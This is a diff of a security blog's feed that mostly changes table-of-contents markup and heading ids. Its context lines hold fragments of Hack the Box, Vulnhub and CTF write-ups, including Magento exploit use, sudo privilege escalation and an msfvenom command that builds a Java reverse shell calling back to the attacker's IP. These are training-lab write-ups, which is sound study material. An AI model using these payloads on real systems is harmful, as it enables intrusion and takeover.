@@ -11,9 +11,27 @@ the solution to root it.&lt;/p&gt;
 &lt;p&gt;&lt;img class="align-left" src="/media/2019.09/swagshop_card.png" alt="Swagshop Card" width="262"&gt;&lt;/p&gt;
 
 
-&lt;p&gt;[TOC]&lt;/p&gt;
-&lt;h1&gt;Recon&lt;/h1&gt;
-&lt;h2&gt;nmap&lt;/h2&gt;
+&lt;div class="toc"&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#recon"&gt;Recon&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#nmap"&gt;nmap&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#web"&gt;Web&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#getting-admin"&gt;Getting Admin&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#to-the-user-flag"&gt;To the user flag&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#the-rce-way"&gt;The RCE way&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#lets-get-root"&gt;let's get root&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#reverse-shell-way"&gt;Reverse shell way&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#wrapping-up"&gt;Wrapping up&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
+&lt;h2 id="nmap"&gt;nmap&lt;/h2&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;# Nmap 7.80 scan initiated Tue Sep 17 14:15:38 2019 as: nmap -oA 10.10.10.140 -sS 10.10.10.140&lt;/span&gt;
 &lt;span class="code-line"&gt;Nmap scan report for 10.10.10.140&lt;/span&gt;
 &lt;span class="code-line"&gt;Host is up (0.019s latency).&lt;/span&gt;
@@ -26,7 +44,7 @@ the solution to root it.&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Web&lt;/h2&gt;
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
 &lt;p&gt;As there is only an SSH and a HTTP port, we continue our recon on the web part.&lt;/p&gt;
 &lt;p&gt;When accessing the website we can observe a Magento website.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Swag shop homepage" src="/media/2019.09/swagshop_3.png"&gt;&lt;/p&gt;
@@ -99,7 +117,7 @@ gives us some information by the version of the application:&lt;/p&gt;
 &lt;li&gt;Magento eCommerce - Remote Code Execution (exploits/xml/webapps/37977.py)&lt;/li&gt;
 &lt;li&gt;Magento CE &amp;lt; 1.9.0.1 - (Authenticated) Remote Code Execution (exploits/php/webapps/37811.py)&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2&gt;Getting Admin&lt;/h2&gt;
+&lt;h2 id="getting-admin"&gt;Getting Admin&lt;/h2&gt;
 &lt;p&gt;The second exploit allow to create an admin account on the application.&lt;/p&gt;
 &lt;p&gt;But the exploit's script use a wrong URL. We add "/index.php/admin/" to the
 target URL:&lt;/p&gt;
@@ -110,7 +128,7 @@ target URL:&lt;/p&gt;
 &lt;p&gt;This will create an administrator account named "forme" with the same password.
 We can then login to the admin panel and access the full magento framework.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="magenta admin panel" src="/media/2019.09/swagshop_1.png"&gt;&lt;/p&gt;
-&lt;h2&gt;To the user flag&lt;/h2&gt;
+&lt;h2 id="to-the-user-flag"&gt;To the user flag&lt;/h2&gt;
 &lt;p&gt;From there a few possibility will allow us to execute code on the application:&lt;/p&gt;
 &lt;p&gt;The first one is to upload a magento extension using the download. A blog
 post from jvoisin explain how to write this "simple" backdoor:
@@ -160,7 +178,7 @@ this parameter in the exploit code (we put 2 years to be safe):&lt;/p&gt;
 &lt;p&gt;We get a remote code execution. From there we can get a reverse shell or do
 everything only with the RCE. I struggle a bit with the reverse shell before
 finding the right one. Therefore I will start with the RCE only exploitation.&lt;/p&gt;
-&lt;h3&gt;The RCE way&lt;/h3&gt;
+&lt;h3 id="the-rce-way"&gt;The RCE way&lt;/h3&gt;
 &lt;p&gt;As the box is often reset by other players we chain the two exploit in a bash
 script.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;python &lt;span class="m"&gt;37977&lt;/span&gt;.py&lt;/span&gt;
@@ -190,7 +208,7 @@ Linux One). So we look at the user directory:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;let's get root&lt;/h2&gt;
+&lt;h2 id="lets-get-root"&gt;let's get root&lt;/h2&gt;
 &lt;p&gt;We start by enumerating our permissions on the box&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;sudo -l&lt;/span&gt;
 &lt;span class="code-line"&gt;Matching Defaults entries for www-data on swagshop:&lt;/span&gt;
@@ -217,7 +235,7 @@ this command without a shell. For that we can use the vi "-c" option:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Reverse shell way&lt;/h3&gt;
+&lt;h3 id="reverse-shell-way"&gt;Reverse shell way&lt;/h3&gt;
 &lt;p&gt;There is another way to resolve this part of the box: using a reverse shell!&lt;/p&gt;
 &lt;p&gt;My classic python reverse shell was not working as there was no python on the box and
 the bash reverse was also not working. Nevertheless, the netcat one was working:&lt;/p&gt;
@@ -270,7 +288,7 @@ We can easily find the user flag:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h1&gt;Wrapping up&lt;/h1&gt;
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
 &lt;p&gt;This box was really interesting. I learned a lot about magento admin panel. As
 the downloader was disabled, the easiest way to execute code on the box was not
 available and I had to find other ways to execute code on a magento website from
@@ -283,7 +301,7 @@ retired &lt;a href="https://www.hackthebox.eu/home/machines/profile/144"&gt;Jerr
 &lt;p&gt;&lt;img class="align-left" src="/media/2019.09/jerry_1.png" alt="Jerry VM homepage" width="262"&gt;&lt;/p&gt;
 
 
-&lt;h1&gt;Hack the Box&lt;/h1&gt;
+&lt;h1 id="hack-the-box"&gt;Hack the Box&lt;/h1&gt;
 &lt;p&gt;In 2018 I started to play with &lt;a href="www.hackthebox.eu"&gt;Hack the box&lt;/a&gt;. The principle
 is similar to the &lt;a href="https://www.vulnhub.com/about/"&gt;vulnhub&lt;/a&gt; machines: You got a
 VM and have to root it. The main difference is that you are connected to a VPN 
@@ -294,7 +312,7 @@ Finally, nobody is publishing Writeup before the VM is retired.&lt;/p&gt;
 writeup.&lt;/p&gt;
 &lt;p&gt;The Jerry machine is Windows server. This VM is classified as a trivial one. In
 fact it is a really easy one.&lt;/p&gt;
-&lt;h1&gt;Network discovery&lt;/h1&gt;
+&lt;h1 id="network-discovery"&gt;Network discovery&lt;/h1&gt;
 &lt;p&gt;As usual, we start with a simple network scan using nmap in order to scan the
 open TCP ports: Only the port 8080 is open with an HTTP service.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# nmap -p- 10.10.10.95 -sSV&lt;/span&gt;
@@ -312,7 +330,7 @@ open TCP ports: Only the port 8080 is open with an HTTP service.&lt;/p&gt;
 
 &lt;p&gt;When going to this page we see a simple Tomcat Application Manager.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Tomcat application manager" src="/media/2019.09/jerry_2.png"&gt;&lt;/p&gt;
-&lt;h1&gt;Exploiting the administration interface&lt;/h1&gt;
+&lt;h1 id="exploiting-the-administration-interface"&gt;Exploiting the administration interface&lt;/h1&gt;
 &lt;p&gt;We generate a Java reverse shell payload using &lt;code&gt;msfvenom&lt;/code&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.14 LPORT=4444 -f war &amp;gt; reverse2.war&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -407,7 +425,7 @@ binaries.
 &lt;a href="https://www.fireeye.com/blog/threat-research/2018/08/announcing-the-fifth-annual-flare-on-challenge.html"&gt;https://www.fireeye.com/blog/threat-research/2018/08/announcing-the-fifth-annual-flare-on-challenge.html&lt;/a&gt;&lt;/p&gt;
 
 
-&lt;h2&gt;Minesweeper Championship Registration&lt;/h2&gt;
+&lt;h2 id="minesweeper-championship-registration"&gt;Minesweeper Championship Registration&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Welcome to the Fifth Annual Flare-On Challenge! The Minesweeper World
 Championship is coming soon and we found the registration app. You weren't
@@ -436,7 +454,7 @@ The &lt;code&gt;InviteValidator&lt;/code&gt; class is the following:&lt;/p&gt;
 
 
 &lt;p&gt;We directly got the challenge flag &lt;code&gt;GoldenTicket2018@flare-on.com&lt;/code&gt;.&lt;/p&gt;
-&lt;h2&gt;Ultimate Minesweeper&lt;/h2&gt;
+&lt;h2 id="ultimate-minesweeper"&gt;Ultimate Minesweeper&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;You hacked your way into the Minesweeper Championship, good job. Now its time to
 compete. Here is the Ultimate Minesweeper binary. Beat it, win the championship,
@@ -496,7 +514,7 @@ squares with our modified binary.&lt;/p&gt;
 &lt;p&gt;And then just reveal this three squares in order to get the Success message with
 the flag.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Capture3.PNG" src="/media/2018.10/Capture3.PNG"&gt;&lt;/p&gt;
-&lt;h2&gt;FLEGGO&lt;/h2&gt;
+&lt;h2 id="fleggo"&gt;FLEGGO&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;When you are finished with your media interviews and talk show appearances after
 that crushing victory at the Minesweeper Championship, I have another task for
@@ -575,7 +593,7 @@ But I manualy identify them and got the order of the flag:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;binstall&lt;/h2&gt;
+&lt;h2 id="binstall"&gt;binstall&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;It is time to get serious. Reverse Engineering isn't about toys and games.
 Sometimes its about malicious software. I recommend you run this next
@@ -594,7 +612,7 @@ someone uploaded it on &lt;a href="https://www.virustotal.com/#/file/1284211e576
 total&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Capture9.PNG" src="/media/2018.10/Capture9.PNG"&gt;&lt;/p&gt;
 &lt;p&gt;I didn't get a lot of time to work on this challenge and didn't solve it.&lt;/p&gt;
-&lt;h1&gt;Contest ending&lt;/h1&gt;
+&lt;h1 id="contest-ending"&gt;Contest ending&lt;/h1&gt;
 &lt;p&gt;The contest is now over and fireEye realse the &lt;a href="https://www.fireeye.com/blog/threat-research/2018/10/2018-flare-on-challenge-solutions.html"&gt;solution for all challenges&lt;/a&gt;.&lt;/p&gt;</content><category term="security"></category><category term="reverse"></category></entry><entry><title>Vulnhub, born2root</title><link href="https://maggick.fr/2017/11/vulnhub-born2root.html" rel="alternate"></link><published>2017-11-20T16:00:00+01:00</published><updated>2017-11-20T16:00:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2017-11-20:/2017/11/vulnhub-born2root.html</id><summary type="html">&lt;p&gt;&lt;img alt="Born2root homepage" class="align-left" src="/media/2017.11/born2root/1.png" width="162"/&gt;&lt;/p&gt;
 &lt;p&gt;After the bulldog machine I worked on the &lt;a href="https://www.vulnhub.com/entry/born2root-1,197/"&gt;born2root&lt;/a&gt; one.
 A simple boot2root machine by &lt;a href="https://twitter.com/h4d3sw0rm"&gt;Hadi Mene&lt;/a&gt;.&lt;/p&gt;
@@ -604,7 +622,7 @@ src="/media/2017.11/born2root/1.png" alt="Born2root homepage" width="162"&gt;&lt
 A simple boot2root machine by &lt;a href="https://twitter.com/h4d3sw0rm"&gt;Hadi Mene&lt;/a&gt;.&lt;/p&gt;
 
 
-&lt;h2&gt;Discovery&lt;/h2&gt;
+&lt;h2 id="discovery"&gt;Discovery&lt;/h2&gt;
 &lt;p&gt;First we scan all port of the VM:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# nmap -sSV 10.0.2.5&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;/span&gt;
@@ -626,7 +644,7 @@ A simple boot2root machine by &lt;a href="https://twitter.com/h4d3sw0rm"&gt;Hadi
 
 &lt;p&gt;So we got a SSH service on port 22 and a web service on the port 80.
 Let's see what the website propose:&lt;/p&gt;
-&lt;h2&gt;Web&lt;/h2&gt;
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
 &lt;p&gt;The website simulate a company selling security services:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Landing page" src="/media/2017.11/born2root/1.png"&gt;&lt;/p&gt;
 &lt;p&gt;The robots.txt file contain 2 url:&lt;/p&gt;
@@ -760,7 +778,7 @@ Let's see what the website propose:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Privilege elevation&lt;/h2&gt;
+&lt;h2 id="privilege-elevation"&gt;Privilege elevation&lt;/h2&gt;
 &lt;p&gt;As always a bit of reconnaissance is needed.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;martin&lt;/span&gt;&lt;span class="nv"&gt;@debian&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;alRh&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
@@ -893,7 +911,7 @@ the first one at the moment:
 A simple boot2root machine by &lt;a href="https://twitter.com/frichette_n"&gt;Nick Frichette&lt;/a&gt;.&lt;/p&gt;
 
 
-&lt;h2&gt;Discovery&lt;/h2&gt;
+&lt;h2 id="discovery"&gt;Discovery&lt;/h2&gt;
 &lt;p&gt;The MOTD of the machine give us its IP address so we can directly launch a nmap at it:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# nmap -sSV 10.0.2.4&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;/span&gt;
@@ -915,7 +933,7 @@ A simple boot2root machine by &lt;a href="https://twitter.com/frichette_n"&gt;Ni
 
 &lt;p&gt;There is a ssh service running on port 23 and two web servers on port 80 and
 8080. The server on both port seems to be the same and talks dogs photographies.&lt;/p&gt;
-&lt;h2&gt;Web&lt;/h2&gt;
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
 &lt;p&gt;&lt;img alt="Website screenshot" src="/media/2017.11/1.png"&gt;&lt;/p&gt;
 &lt;p&gt;We run &lt;code&gt;dirb&lt;/code&gt; on the web server on the port 80:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@kalili&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dirb&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.4&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
@@ -999,7 +1017,7 @@ A simple boot2root machine by &lt;a href="https://twitter.com/frichette_n"&gt;Ni
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;PrivEsc&lt;/h2&gt;
+&lt;h2 id="privesc"&gt;PrivEsc&lt;/h2&gt;
 &lt;p&gt;By looking more into the users directory we discover that we have a read access on djangoadmin
 files and that a &lt;code&gt;.hiddenadmindirectory&lt;/code&gt; is present with a note and an executable:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="nv"&gt;@bulldog&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ahlR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
@@ -1034,7 +1052,7 @@ files and that a &lt;code&gt;.hiddenadmindirectory&lt;/code&gt; is present with 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Reverse&lt;/h3&gt;
+&lt;h3 id="reverse"&gt;Reverse&lt;/h3&gt;
 &lt;p&gt;The note's content is the following:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;Nick&lt;/span&gt;,&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;/span&gt;
@@ -1054,7 +1072,7 @@ files and that a &lt;code&gt;.hiddenadmindirectory&lt;/code&gt; is present with 
 
 
 &lt;p&gt;Then it's reverse, but another lead was found during the reconnaissance for privilege escalation:&lt;/p&gt;
-&lt;h3&gt;Cron&lt;/h3&gt;
+&lt;h3 id="cron"&gt;Cron&lt;/h3&gt;
 &lt;p&gt;By looking at the cron files we also see that there is a runAV task:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="nv"&gt;@bulldog&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ahlR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cron&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="c1"&gt;--r-- 1 root root  722 Apr  5  2016 /etc/crontab&lt;/span&gt;&lt;/span&gt;
@@ -1150,7 +1168,7 @@ It only needed a few lines of python in order to break it.&lt;/p&gt;
 &lt;p&gt;The cryptography algorithm was a symmetric one, that means there is always a
 private key shared between the encryption and the decryption. In fact the
 key was shared for the application.&lt;/p&gt;
-&lt;h2&gt;Encryption algorithm&lt;/h2&gt;
+&lt;h2 id="encryption-algorithm"&gt;Encryption algorithm&lt;/h2&gt;
 &lt;p&gt;The encryption algorithm is the following (I rewrote it in python for a better
 comprehension):&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
@@ -1194,7 +1212,7 @@ operations:&lt;/p&gt;
 
 
 &lt;p&gt;Moreover, by definition: &lt;code&gt;a XOR b XOR a = b&lt;/code&gt;&lt;/p&gt;
-&lt;h2&gt;Breaking things&lt;/h2&gt;
+&lt;h2 id="breaking-things"&gt;Breaking things&lt;/h2&gt;
 &lt;p&gt;In our situation we need to find &lt;code&gt;cipherText&lt;/code&gt; in order to find the md5 hash of
 the private key. However &lt;code&gt;cipherText&lt;/code&gt; is build using the clear text and a random
 number included between 0 and 32 000. Therefore by a
@@ -1261,7 +1279,7 @@ hash (an other option might have be to search for ascii characters).&lt;/p&gt;
 
 &lt;p&gt;We got the md5 hash of the private key. The default key used in the application
 was 8 characters long and was use in other algorithms not home made.&lt;/p&gt;
-&lt;h2&gt;PHP: character XOR character&lt;/h2&gt;
+&lt;h2 id="php-character-xor-character"&gt;PHP: character XOR character&lt;/h2&gt;
 &lt;p&gt;PHP is doing really funny things, most of you know that.
 When analysing the original PHP code of the encryption function, I found
 something very strange:&lt;/p&gt;
@@ -1279,7 +1297,7 @@ python code:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Full code&lt;/h2&gt;
+&lt;h2 id="full-code"&gt;Full code&lt;/h2&gt;
 &lt;p&gt;The complete code is the following:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;&lt;/span&gt;
@@ -1402,7 +1420,7 @@ modifications (spell correction for instance).&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Declaration&lt;/h2&gt;
+&lt;h2 id="declaration"&gt;Declaration&lt;/h2&gt;
 &lt;p&gt;Let us break it a bit. First the declaration part:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -1410,7 +1428,7 @@ modifications (spell correction for instance).&lt;/p&gt;
 
 &lt;p&gt;We do not need the root right so &lt;code&gt;sudo&lt;/code&gt; is not needed. Moreover we use the
 python language.&lt;/p&gt;
-&lt;h2&gt;install&lt;/h2&gt;
+&lt;h2 id="install"&gt;install&lt;/h2&gt;
 &lt;p&gt;The installation part:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;install&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;  &lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;github&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;wummel&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;linkchecker&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;issues&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;649&lt;/span&gt;&lt;/span&gt;
@@ -1441,7 +1459,7 @@ python language.&lt;/p&gt;
 &lt;a href="https://github.com/maggick/maggner-pelican"&gt;github&lt;/a&gt;, we also download the &lt;a href="https://github.com/getpelican/pelican-plugins"&gt;pelican plugins&lt;/a&gt;.
 We need to get the last build of the site in order to not re publish all the
 articles in the RSS feed (it happened once when writing this configuration).&lt;/p&gt;
-&lt;h2&gt;Script&lt;/h2&gt;
+&lt;h2 id="script"&gt;Script&lt;/h2&gt;
 &lt;p&gt;The script part is where the magic happen, this part will build the site and
 give a red or green status depending of the output of each script. If all of
 them exit without error the build is green otherwise the build is red.&lt;/p&gt;
@@ -1457,7 +1475,7 @@ every file and exit with an error if a link return something else that an HTTP
 200 OK.&lt;/p&gt;
 &lt;p&gt;Then we use &lt;a href="http://getpelican.com/"&gt;pelican&lt;/a&gt; to build the site. If an error happened during
 the build the script will also exit with an error.&lt;/p&gt;
-&lt;h2&gt;After success&lt;/h2&gt;
+&lt;h2 id="after-success"&gt;After success&lt;/h2&gt;
 &lt;p&gt;Finally, after the success of the two script we deploy the site on github pages,
 we publish the site on &lt;a href="https://pages.github.com/"&gt;github pages&lt;/a&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;after_success&lt;/span&gt;:&lt;/span&gt;
@@ -1481,7 +1499,15 @@ solution yet (mostly for commit from browser).&lt;/p&gt;</content><category term
 &lt;strong&gt;The Half Crunchy&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;The theme was "RISE OF THE MACHINES" with rogue webserver and flawing cat robot.&lt;/p&gt;
 &lt;p&gt;We finished 42th with 550 points flagging 5 challenges:&lt;/p&gt;
-&lt;p&gt;[TOC]&lt;/p&gt;
+&lt;div class="toc"&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#smarttomcat"&gt;Smarttomcat&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#cryptquizz"&gt;Cryptquizz&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#shobot"&gt;Shobot&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#the-great-escape-part-1"&gt;The great escape - part 1&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#the-great-escape-part-2"&gt;The great escape - part 2&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
 &lt;p&gt;&lt;img alt="scoreboard" src="/media/2017.01/scoreboard.png"/&gt;&lt;/p&gt;
 &lt;p&gt;Many thanks to the organisation! It was a really nice CTF.&lt;/p&gt;
 &lt;p&gt;Thanks to all team members who participated.&lt;/p&gt;
@@ -1489,13 +1515,21 @@ solution yet (mostly for commit from browser).&lt;/p&gt;</content><category term
 &lt;strong&gt;The Half Crunchy&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;The theme was "RISE OF THE MACHINES" with rogue webserver and flawing cat robot.&lt;/p&gt;
 &lt;p&gt;We finished 42th with 550 points flagging 5 challenges:&lt;/p&gt;
-&lt;p&gt;[TOC]&lt;/p&gt;
+&lt;div class="toc"&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#smarttomcat"&gt;Smarttomcat&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#cryptquizz"&gt;Cryptquizz&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#shobot"&gt;Shobot&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#the-great-escape-part-1"&gt;The great escape - part 1&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#the-great-escape-part-2"&gt;The great escape - part 2&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
 &lt;p&gt;&lt;img alt="scoreboard" src="/media/2017.01/scoreboard.png"&gt;&lt;/p&gt;
 &lt;p&gt;Many thanks to the organisation! It was a really nice CTF.&lt;/p&gt;
 &lt;p&gt;Thanks to all team members who participated.&lt;/p&gt;
 
 
-&lt;h2&gt;Smarttomcat&lt;/h2&gt;
+&lt;h2 id="smarttomcat"&gt;Smarttomcat&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart
 tomcat robot.&lt;/p&gt;
@@ -1553,7 +1587,7 @@ the default user and password for tomcat manager:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
